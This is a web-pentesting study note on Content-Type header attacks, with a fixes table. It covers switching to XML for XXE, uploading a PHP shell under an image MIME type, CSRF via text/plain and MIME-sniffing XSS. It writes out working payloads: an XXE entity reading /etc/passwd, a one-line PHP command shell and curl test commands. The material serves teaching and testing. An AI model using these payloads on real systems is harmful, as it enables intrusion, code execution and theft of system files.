---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.19 Content-Type — Type Confusion, JSON/XML Switching"
---

# 03.19 — Content-Type

## What is it?

The `Content-Type` header specifies the media type of the request or response body. In requests, it tells the server how to parse the body. In responses, it tells the browser how to render/handle the data. Manipulating Content-Type can confuse parsers, bypass WAFs, trigger unexpected behaviors, and switch between different parsers on the backend.

---

## Common Content-Types

```
REQUEST BODY TYPES:
  application/x-www-form-urlencoded  → form data (key=value&key2=value2)
  application/json                    → JSON body
  application/xml                     → XML body
  multipart/form-data                 → file uploads (has boundary)
  text/plain                          → raw text
  application/graphql                 → GraphQL queries
  application/octet-stream            → binary data

RESPONSE TYPES:
  text/html                           → HTML page
  application/json                    → JSON API response
  image/png, image/jpeg               → image
  application/javascript              → JS file
  text/css                            → CSS file
```

---

## Attack 1: Content-Type Switch for Parser Confusion

```
SCENARIO: API accepts JSON normally.
  POST /api/user HTTP/1.1
  Content-Type: application/json
  {"username":"admin","role":"user"}

ATTACK: Switch to XML → trigger XXE!
  POST /api/user HTTP/1.1
  Content-Type: application/xml
  
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <user><username>&xxe;</username></user>
  
  If backend switches parser based on Content-Type → XXE!

ATTACK: Switch to URL-encoded → parameter pollution!
  POST /api/user HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  username=admin&role=admin&role=user
  → HPP: which role does the app use?
```

**PortSwigger:** XXE via Content-Type switching (XXE lab series)

---

## Attack 2: File Upload MIME Bypass

```
SCENARIO: File upload checks Content-Type for validation.
  Block: Content-Type: application/php, text/x-php
  Allow: Content-Type: image/jpeg

BYPASS:
  Upload PHP shell but set Content-Type: image/jpeg
  
  POST /upload HTTP/1.1
  Content-Type: multipart/form-data; boundary=----abc
  
  ------abc
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg    ← lies about type
  
  <?php system($_GET['cmd']); ?>
  ------abc--
  
  Server accepts because Content-Type says it's an image!
  (Server-side magic byte check would catch this — real uploads also need magic bytes)
```

---

## Attack 3: CORS Simple vs Preflight Request

```
CORS "simple requests" (no preflight):
  Content-Type must be: application/x-www-form-urlencoded
                        multipart/form-data
                        text/plain

NON-SIMPLE requests (require preflight OPTIONS):
  Content-Type: application/json  ← this triggers preflight!

ATTACK:
  If CORS policy allows credentials only for "simple" requests
  but app JSON endpoint processes URL-encoded data too:
  → Make CSRF attack as simple request (Content-Type: text/plain)!
  
  POST /transfer HTTP/1.1
  Content-Type: text/plain
  Body: {"amount":"1000","to":"attacker"}
  → If backend parses this as JSON → CSRF without preflight!
```

---

## Attack 4: Response Content-Type MIME Sniffing

```
SCENARIO: Server returns user-uploaded content with wrong Content-Type.
  Content-Type: text/plain
  Body: <script>alert(1)</script>

If browser MIME-sniffs → renders as HTML → XSS!

ATTACK: Upload HTML/JS file and serve via endpoint that sets wrong type.
FIX: X-Content-Type-Options: nosniff (see note 35)
```

---

## Testing

```bash
# Change Content-Type to XML and add XXE
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'

# Try switching from JSON to form-encoded
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&role=admin"

# CORS test: try JSON endpoint with text/plain
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: text/plain" \
  -d '{"amount":1000,"to":"attacker"}'
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Backend switches parser on Content-Type | Validate content against expected schema regardless of type |
| File upload trusts Content-Type | Check file magic bytes, not just Content-Type header |
| MIME sniffing XSS | Set `X-Content-Type-Options: nosniff` |
| No Content-Type validation | Reject unexpected Content-Type values |

---

## Related Notes
- [[02.14 - MIME Types and Content-Type]] — MIME types deep dive
- [[35 - X-Content-Type-Options]] — nosniff protection
- [[Module 05 - XXE]] — XXE attacks via Content-Type switch
- [[Module 08 - File Upload]] — upload bypass techniques
